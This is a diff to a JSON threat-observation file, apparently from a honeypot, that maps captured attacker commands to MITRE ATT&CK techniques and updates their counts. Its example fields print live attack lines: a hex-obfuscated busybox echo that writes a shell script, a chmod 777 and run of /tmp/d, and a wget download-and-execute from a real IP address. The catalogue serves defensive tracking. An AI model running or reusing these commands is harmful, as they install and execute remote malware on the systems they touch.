@@ -1,5 +1,4 @@
 {
-  "schema_version": "1.0",
   "techniques": [
     {
       "id": "T1027",
@@ -8,8 +7,8 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 76760,
-      "distinct_ips": 291,
+      "count": 76768,
+      "distinct_ips": 292,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
         "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x69\\x6E\\x20\\x2F\\x70\\x72\\x6F\\x63\" > .k",
@@ -25,7 +24,7 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 5504,
+      "count": 5519,
       "distinct_ips": 337,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -42,7 +41,7 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2224,
+      "count": 2227,
       "distinct_ips": 314,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -182,6 +181,6 @@
       ]
     }
   ],
-  "total_commands": 250117,
-  "matched_commands": 82979
+  "total_commands": 250148,
+  "matched_commands": 83002
 }
